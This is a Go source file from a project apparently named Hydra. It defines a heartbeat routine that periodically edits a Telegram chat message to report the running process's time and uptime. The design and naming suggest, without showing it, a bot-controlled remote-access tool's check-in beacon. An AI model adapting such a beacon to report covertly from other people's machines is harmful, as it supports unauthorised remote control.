package api

import (
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/Raffy27/Hydra/util"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

var (
	//StopHeartbeat signals the associated goroutine to stop when it is closed.
	StopHeartbeat chan struct{}
	Genesis       int
)

type beatConfig struct {
	header string
	time   time.Time
	uptime time.Duration
	footer string
}

func (b *beatConfig) Format() string {
	return fmt.Sprintf("%s\n```\nTime:   %s\nUptime: %s\n```\n%s",
		b.header,
		strings.Replace(b.time.Format(time.RFC3339), "T", " ", 1),
		fmt.Sprint(b.uptime),
		b.footer,
	)
}

func NewGenesis() {
	if StopHeartbeat != nil {
		close(StopHeartbeat)
	}
	m := tgbotapi.NewMessage(util.ChatID, util.GenesisText)
	msg, _ := Bot.Send(m)
	Genesis = msg.MessageID
}

//Heartbeat is the function that provides status updates.
func Heartbeat() {
	log.Println("Heartbeat started")
	StopHeartbeat = make(chan struct{})
	ticker := time.NewTicker(util.Interval * time.Second)
	//Create edit struct
	status := tgbotapi.NewEditMessageText(util.ChatID, Genesis, "")
	status.ParseMode = "Markdown"
	beat := beatConfig{
		header: "🐱‍💻",
	}
	for {
		select {
		case <-ticker.C:
			beat.time = time.Now()
			beat.uptime = time.Since(util.StartTime)
			status.Text = beat.Format()
			Bot.Send(status)
		case <-StopHeartbeat:
			ticker.Stop()
			log.Println("Heartbeat stopped")
			return
		}
	}
}
